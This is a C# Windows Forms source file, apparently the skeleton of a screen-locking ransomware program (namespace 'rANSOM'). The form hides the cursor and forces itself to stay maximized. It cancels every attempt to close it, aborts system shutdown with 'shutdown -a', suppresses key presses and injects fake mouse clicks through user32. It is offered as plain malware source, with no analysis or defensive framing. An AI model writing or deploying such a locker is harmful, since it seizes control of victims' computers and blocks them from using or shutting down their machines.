using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace rANSOM
{
    public partial class Form1 : Form
    {

        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwFlags);

        public Form1()
        {
            InitializeComponent();
            Cursor.Hide();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Maximized)
                this.WindowState = FormWindowState.Maximized;
        }

        private void preventClosing(object sender, FormClosingEventArgs e)
        {
           e.Cancel = true;
            if (e.CloseReason == CloseReason.WindowsShutDown)
            {
                Process.Start("shutdown", " -a");
            }
           
        }

        private void keyPressAction(object sender, KeyEventArgs e)
        {
            e.SuppressKeyPress = true;
            System.Threading.Thread.Sleep(666);
            Cursor.Position = new System.Drawing.Point(1000,0);
            mouse_event(0x002|0x004);

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
